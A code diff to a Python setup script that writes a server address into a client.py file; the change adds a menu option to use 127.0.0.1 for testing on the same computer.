@@ -22,6 +22,7 @@ if not os.path.isfile("client.py"):
 print("1. Use: " + strCurrentIP)
 print("2. Use a different IP address for server")
 print("3. Use a DNS Hostname")
+print("4. Use 127.0.0.1 (for testing on this computer)")
 
 strChoice = ""
 strChoice = input("\n" + "Type selection: ")
@@ -32,6 +33,8 @@ elif strChoice == "2":
     strCurrentIP = input("\n" + "Enter IP: ")
 elif strChoice == "3":
     strDNSHostname = input("\n" + "Enter DNS Hostname: ")
+elif strChoice == "4":
+    strCurrentIP = "127.0.0.1"
 else:
     print("Invalid Choice!")
     sys.exit(0)
@@ -77,7 +80,7 @@ arrFileContents = objClientFile.readlines()
 objClientFile.close()
 
 # if the user is not using dns
-if strChoice == "2" or strChoice == "1":
+if strChoice == "2" or strChoice == "1" or strChoice == "4":
     for intCounter in range(0, len(arrFileContents)):
         # check for the first occurrence of the host
         if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
